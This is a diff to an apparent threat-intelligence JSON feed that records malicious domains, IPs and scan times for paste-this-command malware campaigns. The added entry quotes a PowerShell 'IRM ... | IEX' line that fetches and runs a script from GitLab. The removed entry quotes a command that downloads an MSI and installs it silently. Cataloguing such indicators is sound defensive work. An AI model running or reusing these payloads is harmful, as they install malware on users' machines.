@@ -1,5 +1,25 @@
 [
   {
+    "UrlDomain": "esperanzafernandez.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "217.160.0.75"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
+    ],
+    "ReportId": "cmwhtrhxt0u6a0omlo9x4ag7g",
+    "ScannedAt": "2026-11-15T12:42:41.466000+00:00"
+  },
+  {
     "UrlDomain": "adplaret.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -1579,24 +1599,5 @@
     ],
     "ReportId": "cmwf2w2a00fkl0oml1ac8kcxp",
     "ScannedAt": "2026-11-13T14:34:52.466000+00:00"
-  },
-  {
-    "UrlDomain": "distinctiontraining.com.au",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "82.38.138.35"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwezgr170fas0omlma6arc0q",
-    "ScannedAt": "2026-11-13T12:58:59.214000+00:00"
   }
 ]
